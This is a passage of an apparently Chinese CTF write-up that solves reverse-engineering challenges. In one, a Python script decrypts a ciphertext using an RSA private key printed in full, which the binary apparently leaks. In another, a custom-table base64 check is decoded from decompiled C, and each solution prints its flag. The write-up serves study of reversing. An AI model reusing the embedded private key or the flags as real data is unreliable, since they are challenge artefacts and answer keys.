class="line">GLIBC_2.4</span><br><span class="line">GLIBC_2.34</span><br><span class="line">GLIBC_2.2.5</span><br><span class="line">PTE1</span><br><span class="line">u+UH</span><br><span class="line">&lt;=t2</span><br><span class="line">&lt;=t+</span><br><span class="line">[S]Warning! This version has deprecated, please updata!!</span><br><span class="line">[S]Version Checking...</span><br><span class="line">[S]version: 114.5.14 (newest)</span><br><span class="line">[S]Welcome to the RSA encryption program!!!</span><br><span class="line">[S]Tell me your ciphertext or plaintext:</span><br><span class="line">[S]Ciphertext checking...</span><br><span class="line">[S]Right ciphertext!!!!!!!!!!!!!!!!!!!!!</span><br><span class="line">[S]Not ciphtertext</span><br><span class="line">[S]Environment checking...</span><br><span class="line">libcrypto.so</span><br><span class="line">[S]No OpenSSL <span class="keyword">in</span> your <span class="built_in">env</span>!! <span class="built_in">exit</span></span><br><span class="line">[S]OpenSSL <span class="built_in">env</span> work</span><br><span class="line">[S]Encrypting your plaintext...</span><br><span class="line">[S]Decrypting your ciphertext...</span><br><span class="line">[S]Warning!! RSA decrypt func has deprecated</span><br><span class="line">[S]Error: NULL input</span><br><span class="line">[S]Failed to get private key!</span><br><span class="line">[S]BIO creation failed!</span><br><span class="line">[S]Load private key error: %s</span><br><span class="line">[S]EVP_PKEY_CTX_new error: %s</span><br><span class="line">[S]EVP_PKEY_decrypt_init error: %s</span><br><span class="line">[S]Set padding error: %s</span><br><span class="line">[S]Get output length error: %s</span><br><span class="line">[S]Malloc error!</span><br><span class="line">[S]Decrypt error: %s</span><br><span class="line">[S]Warning!! RSA encrypt func has deprecated</span><br><span class="line">[S]Invalid input parameters!</span><br><span class="line">[S]Failed to get public key!</span><br><span class="line">[S]Load public key error: %s</span><br><span class="line">[S]EVP_PKEY_encrypt_init error: %s</span><br><span class="line">[S]Encrypt error: %s</span><br><span class="line">[S]Plesase find the key and <span class="keyword">then</span> <span class="keyword">do</span> what you want :)</span><br><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</span><br><span class="line">?456789:;&lt;=</span><br><span class="line"> !<span class="string">&quot;#$%&amp;&#x27;()*+,-./0123</span></span><br><span class="line"><span class="string">9*3$&quot;</span></span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCPsj+c/7xPr54hxUnTWHc9fxqQ</span><br><span class="line">rHkZgoM3VGXTlu7C1UxLFZiWjZ0r8u6SgtFUm4qnKzgpaNRgSL22umNbdIaQCUls</span><br><span class="line">mxozADlYtQ4FOCZUGuDMQe/f8TcVPIuHjIgmNfIPu1+yy4NZDnZfOf6Y7B6jKEJ4</span><br><span class="line">ROfzXCKTuRWS+6pRwQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">UEtuNkI3eHo5QU0zd3d3TllablFJeDJSbkNEUUw1MlhxMU05em5CTXhCeHdSUUpKTGRhRE5RN1h5VkVhS3MvcjVyM0QyV0pTNkhKVWFwdU8yMHZFc01XRnlOdXplUUhWeHJRUkx3OHZIWFQvcGdDNWtPanZyZVJES0xnbVdlam4wa2xMUWJrQVJveDlmN1ErMXgzNzBZSUZvdUxyTlFVakpPVHlLdUdtdWtrPQ==</span><br><span class="line">GCC: (Ubuntu 14.2.0-4ubuntu2~24.04) 14.2.0</span><br><span class="line">.shstrtab</span><br><span class="line">.interp</span><br><span class="line">.note.gnu.property</span><br><span class="line">.note.gnu.build-id</span><br><span class="line">.note.ABI-tag</span><br><span class="line">.gnu.hash</span><br><span class="line">.dynsym</span><br><span class="line">.dynstr</span><br><span class="line">.gnu.version</span><br><span class="line">.gnu.version_r</span><br><span class="line">.rela.dyn</span><br><span class="line">.rela.plt</span><br><span class="line">.init</span><br><span class="line">.plt.got</span><br><span class="line">.plt.sec</span><br><span class="line">.text</span><br><span class="line">.fini</span><br><span class="line">.rodata</span><br><span class="line">.eh_frame_hdr</span><br><span class="line">.eh_frame</span><br><span class="line">.init_array</span><br><span class="line">.fini_array</span><br><span class="line">.dynamic</span><br><span class="line">.data</span><br><span class="line">.bss</span><br><span class="line">.comment</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP, PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA1, SHA256</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment"># 私钥（确保格式正确）</span></span><br><span class="line">private_key_pem = <span class="string">&quot;&quot;&quot;-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAI+yP5z/vE+vniHF</span></span><br><span class="line"><span class="string">SdNYdz1/GpCseRmCgzdUZdOW7sLVTEsVmJaNnSvy7pKC0VSbiqcrOClo1GBIvba6</span></span><br><span class="line"><span class="string">Y1t0hpAJSWybGjMAOVi1DgU4JlQa4MxB79/xNxU8i4eMiCY18g+7X7LLg1kOdl85</span></span><br><span class="line"><span class="string">/pjsHqMoQnhE5/NcIpO5FZL7qlHBAgMBAAECgYBrAe5lV/w/yyQTOfv0KxkA7ro1</span></span><br><span class="line"><span class="string">qnq0CID2nx8FJoy/AmBCOd7bnrHAnLQU3t5MB1iFjKXSEIK3APRmMv7yiB/724Np</span></span><br><span class="line"><span class="string">qUUSfXVfmzI5j+nc8vPHDfjCrOVMuRfJTqn8Y/unv8MW2zks7DbEwkBy99GSUV/K</span></span><br><span class="line"><span class="string">/pFC2FkhamDfRkhfAQJBANfvnbwXi6GX7SPfdlaikfP9zTiH3RLssGqyp0A/TUsy</span></span><br><span class="line"><span class="string">LhDr3fmuPlQTxIdHw1HzeS3nyd+r2sz2FsK8cORBSqkCQQCqW3BCnjb6NkKWJRy/</span></span><br><span class="line"><span class="string">zL/3K4qD4OfLAiULD+Yo+crkCPvasieffylt2Eld8OfloztrX2EV9r5Ox87LUsRZ</span></span><br><span class="line"><span class="string">S5VZAkEAucL2BAiRY3tqUxD7Ib6LJsYxFK+0nIInpjJ4tUl/ue+6N25hsFiYYAX9</span></span><br><span class="line"><span class="string">bI9s1QRKPBaJ0TRrbyVJIU+xInuUuQJAfRf/6ys6u6k0ZASEg+LZ46o5YHW6P7wn</span></span><br><span class="line"><span class="string">b2QRYm1qquBd8E16AwjhZyO3XCAWaO3gKAw1wmcZf8gA9hSk0d1KoQJAa75FKWmL</span></span><br><span class="line"><span class="string">JhUlWs+kG+KdhEQNkVu0lfxv7Bqwf1/AzddwBcbO1XrD3VeUFj7GmRLTLKn8qqte</span></span><br><span class="line"><span class="string">ly52zDvm5DlwWA==</span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">ciphertext_b64 = <span class="string">&quot;PKn6B7xz9AM3wwwNYZnQIx2RnCDQL52Xq1M9znBMxBxwRQJJLdaDNQ7XyVEaKs/r5r3D2WJS6HJUapuO20vEsMWFyNuzeQHVxrQRLw8vHXT/pgC5kOjvreRDKLgmWejn0klLQbkARox9f7Q+1x370YIFouLrNQUjJOTyKuGmukk=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_rsa</span>():   </span><br><span class="line">    <span class="comment"># 1. 加载私钥</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        private_key = RSA.import_key(private_key_pem)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;✅ 私钥加载成功&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;   密钥大小: <span class="subst">&#123;private_key.size_in_bits()&#125;</span> bits&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ 私钥加载失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 解码密文</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ciphertext = b64decode(ciphertext_b64)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;✅ 密文解码成功&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;   密文长度: <span class="subst">&#123;<span class="built_in">len</span>(ciphertext)&#125;</span> bytes (<span class="subst">&#123;<span class="built_in">len</span>(ciphertext)*<span class="number">8</span>&#125;</span> bits)&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查密文长度是否符合1024位RSA</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ciphertext) == <span class="number">128</span>:  <span class="comment"># 1024位 = 128字节</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   ✅ 密文长度符合1024位RSA&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   ⚠️  密文长度异常: 期望128字节，实际<span class="subst">&#123;<span class="built_in">len</span>(ciphertext)&#125;</span>字节&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ 密文解码失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;尝试不同的解密方式...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. 尝试PKCS1_v1_5解密（最常用）</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n1. 尝试PKCS1_v1_5解密:&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cipher = PKCS1_v1_5.new(private_key)</span><br><span class="line">        decrypted = cipher.decrypt(ciphertext, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> decrypted:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   ✅ 解密成功!&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   解密结果: <span class="subst">&#123;decrypted&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   十六进制: <span class="subst">&#123;binascii.hexlify(decrypted).decode()&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;   文本(UTF-8): <span class="subst">&#123;decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;   文本(GBK): <span class="subst">&#123;decrypted.decode(<span class="string">&#x27;gbk&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;   无法解码为常见文本格式&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   ❌ 解密失败: 无效填充&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;   ❌ 解密出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    decrypt_rsa()</span><br></pre></td></tr></table></figure>
<p><strong>CBCTF{nev3r_1e@k_y00r_PR1V@t3_k8Y}</strong></p>
<ul>
<li>BF5</li>
</ul>
<blockquote>
<p>不能玩战地6的T0FV404深陷绝望之中，只能用战地5捞薯条解决乏闷，结果管理员直接把他踢了，需要flag来重新登录，你能帮帮他吗？(建议做完本题后在去做BF6)</p>
</blockquote>
<p>点到主函数看看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_411D00</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  __int64 v2; <span class="comment">// [esp-8h] [ebp-124h]</span></span><br><span class="line">  <span class="type">char</span> *Block; <span class="comment">// [esp+D0h] [ebp-4Ch]</span></span><br><span class="line">  _DWORD v4[<span class="number">3</span>]; <span class="comment">// [esp+DCh] [ebp-40h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// [esp+E8h] [ebp-34h]</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">4</span>]; <span class="comment">// [esp+F4h] [ebp-28h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+F8h] [ebp-24h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+FCh] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+100h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+104h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+108h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+10Ch] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+110h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> savedregs; <span class="comment">// [esp+11Ch] [ebp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_411325(&amp;unk_41C0A3);</span><br><span class="line">  *(_DWORD *)Str = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;T0FV404 is playing BF5 and farming noobs.&quot;</span>);</span><br><span class="line">  sub_411352();</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;Oh,nooooo!The administrator kicked T0FV404 out of the server,and a flag is required for him to rejoin.Can you help him?&quot;</span>);</span><br><span class="line">  sub_411352();</span><br><span class="line">  sub_41119A(<span class="string">&quot;%31s&quot;</span>, (<span class="type">char</span>)Str);</span><br><span class="line">  v5 = j_strlen(Str);</span><br><span class="line">  v4[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  Block = (<span class="type">char</span> *)sub_411023(Str, v5, v4);</span><br><span class="line">  sub_411320(Block);</span><br><span class="line">  <span class="built_in">free</span>(Block);</span><br><span class="line">  sub_411352();</span><br><span class="line">  sub_41127B(&amp;savedregs, &amp;dword_411E0C, <span class="number">0</span>, v0);</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>1023函数跳转到17A0：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_4117A0</span><span class="params">(<span class="type">char</span> *Str, <span class="type">size_t</span> a2, _DWORD *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> Size; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+10h] [ebp-160h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+10h] [ebp-160h]</span></span><br><span class="line">  <span class="type">char</span> n61; <span class="comment">// [esp+13h] [ebp-15Dh]</span></span><br><span class="line">  <span class="type">char</span> n61_1; <span class="comment">// [esp+13h] [ebp-15Dh]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [esp+E4h] [ebp-8Ch]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+FCh] [ebp-74h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+108h] [ebp-68h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+138h] [ebp-38h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+144h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+144h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [esp+144h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp+144h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">size_t</span> v17; <span class="comment">// [esp+150h] [ebp-20h]</span></span><br><span class="line">  <span class="type">size_t</span> v18; <span class="comment">// [esp+150h] [ebp-20h]</span></span><br><span class="line">  <span class="type">size_t</span> v19; <span class="comment">// [esp+150h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  sub_411325(&amp;unk_41C0A3);</span><br><span class="line">  *a3 = <span class="number">4</span> * ((a2 + <span class="number">2</span>) / <span class="number">3</span>);</span><br><span class="line">  Size = *a3 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *a3 == <span class="number">-1</span> )</span><br><span class="line">    Size = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">malloc</span>(Size);</span><br><span class="line">  v12 = sub_411352();</span><br><span class="line">  <span class="keyword">if</span> ( !v12 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v17 &lt; a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = Str[v17];</span><br><span class="line">    v18 = v17 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v18 &gt;= a2 )</span><br><span class="line">      v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v5 = Str[v18];</span><br><span class="line">    v10 = v5;</span><br><span class="line">    v19 = v18 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v19 &gt;= a2 )</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v6 = Str[v19];</span><br><span class="line">    v17 = v19 + <span class="number">1</span>;</span><br><span class="line">    v9 = v6 | (v10 &lt;&lt; <span class="number">8</span>) | (v11 &lt;&lt; <span class="number">16</span>);</span><br><span class="line">    *(_BYTE *)(v13 + v12) = aAbcdefghijklmn[(v9 &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3F</span>];<span class="comment">// &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">    v14 = v13 + <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(v14 + v12) = aAbcdefghijklmn[(v9 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3F</span>];<span class="comment">// &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">    v15 = v14 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v17 &lt;= a2 + <span class="number">1</span> )</span><br><span class="line">      n61 = aAbcdefghijklmn[(v9 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3F</span>];  <span class="comment">// &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      n61 = <span class="number">61</span>;</span><br><span class="line">    *(_BYTE *)(v15 + v12) = n61;</span><br><span class="line">    v16 = v15 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v17 &lt;= a2 )</span><br><span class="line">      n61_1 = aAbcdefghijklmn[v9 &amp; <span class="number">0x3F</span>];       <span class="comment">// &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      n61_1 = <span class="number">61</span>;</span><br><span class="line">    *(_BYTE *)(v16 + v12) = n61_1;</span><br><span class="line">    v13 = v16 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(v12 + *a3) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>1320跳转1B30，函数找到密文</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_411B30</span><span class="params">(<span class="type">char</span> *Str)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// [esp+D0h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_411325(&amp;unk_41C0A3);</span><br><span class="line">  <span class="keyword">if</span> ( !Str )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; j_strlen(Str); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( Str[i] != byte_417B30[i] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now you can enter the server.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_411352();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.rdata:00417B30 51                                byte_417B30 db 51h                      ; DATA XREF: sub_411B30+6D↑r</span><br><span class="line">.rdata:00417B31 30 4C 44 57 45 5A 36 51 61 58…    a0ldwez6qax7ymf db &#x27;0LDWEZ6QaX7YmFmY1GmXVbltW9fNI9aGY0=&#x27;,0</span><br></pre></td></tr></table></figure>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">custom_table = <span class="string">&quot;CBADEFIHGLKJNMOPQRSTUWVYXZqwertyuiopasdfghjklzxcvbnm0721345689+/&quot;</span></span><br><span class="line">standard_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;Q0LDWEZ6QaX7YmFmY1GmXVbltW9fNI9aGY0=&quot;</span></span><br><span class="line"><span class="comment"># 将自定义表编码的字符串转成标准表编码的字符串</span></span><br><span class="line">trans = <span class="built_in">str</span>.maketrans(custom_table, standard_table)</span><br><span class="line">std_enc = enc.translate(trans)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 标准 Base64 解码</span></span><br><span class="line">flag_bytes = base64.b64decode(std_enc)</span><br><span class="line"><span class="built_in">print</span>(flag_bytes.decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p><strong>CBCTF{BF5_1s_r3ally_g0od!}</strong></p>
<ul>
<li>Strange</li>
</ul>
<blockquote>
<p>这代码怎么看着这么奇怪呢</p>
</blockquote>
<p>有点震惊，签到题加花？？？</p>
<p>strings搜索一下</p>
